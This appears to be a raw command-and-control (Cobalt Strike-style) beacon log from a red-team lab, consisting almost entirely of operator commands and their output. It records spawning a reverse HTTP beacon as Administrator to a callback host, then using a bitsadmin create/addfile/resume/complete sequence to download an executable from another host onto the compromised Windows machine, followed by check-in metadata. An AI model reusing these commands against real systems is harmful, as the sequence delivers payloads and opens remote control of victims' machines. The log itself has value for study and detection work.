02/04 15:52:48 [task] Tasked beacon to spawn windows/beacon_http/reverse_http (172.17.2.56:80) as Administrators\a
02/04 15:52:48 [task] Tasked beacon to run: bitsadmin /create addfile
02/04 15:52:48 [task] Tasked beacon to run: bitsadmin /addfile addfile http://172.17.2.57:8080/test_1197.exe  c:\RedTeam\test.exe
02/04 15:52:48 [task] Tasked beacon to run: bitsadmin /RESUME addfile
02/04 15:52:48 [task] Tasked beacon to run: bitsadmin /complete addfile
02/04 15:53:19 [checkin] host called home, sent: 3929 bytes
02/04 15:53:22 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Created job {571D2410-896A-4D16-AE32-9EF0F16E70D7}.


02/04 15:53:22 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Added http://172.17.2.57:8080/test_1197.exe -> c:\RedTeam\test.exe to job.


02/04 15:53:22 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job resumed.


02/04 15:53:22 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job completed.


02/04 16:57:30 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 3376; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/04 17:45:08 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 3376; os: Windows; version: 6.1; beacon arch: x86 (x64)
